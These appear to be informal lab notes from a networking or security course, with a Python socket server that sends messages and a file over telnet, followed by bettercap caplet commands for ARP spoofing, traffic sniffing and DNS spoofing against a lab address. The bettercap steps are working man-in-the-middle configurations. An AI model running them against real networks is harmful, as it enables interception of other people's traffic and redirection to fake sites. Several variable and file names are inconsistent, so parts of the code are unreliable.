import socket
my_socket=socket.socket()
my_socket.bind(("0.0.0.0",8000))
my_socket.listen()
(client_socket,(ip,port))=my_socket.accept()
telnet ip port(same port)-> on client machine
client_socket.send(b"python rocks")

data=clientsocket.recv(2048)
print(data)

on client side, first send the message to server and then receive on servr side with clientsocket.recv(2048)

client_Socket.close()
my_Socket.close()

-------------------------------------------------------------------
f=open('<filename>','rb')
file=f.read()
<client name>.send(file)

after connection established on client side with telnet,
telnet ip port > file1.txt

---------------------------------------------------------------------
DNS Spoofing/sniffing/poisoning-

nano sppof.cap-
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.80.129
arp.spoof on
set net.sniff.local true
net.sniff on
set dns.spoof.all true
set dns.spoof.domains iacsd.com
dns.spoof on


run ./bettercap -iface ens33 -caplet spoof.cap
default apache site will open (As user typed iacsd.com on browswer but we spoofed his dns and redirected him to apache,or any other site)
apt-get install links
links www.iacsd.com
--------------------------
ARP sniffing/sniffing/poisioning- needs bettercap zip version.

download bettercap zip file from link, then unzip the file.
apt-get install libnetfilter-queue-dev libpcap-dev
./bettercap --version
nano spoof.cap
under nano->
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.80.129 (target ip on which we need to sniff)
arp.spoof on
set net.sniff.local true
net.sniff on
*save sniff.cap*
./bettercap -iface ens33 -caplet sniff.cap
Run any website on target machine, then the logs will be visible.
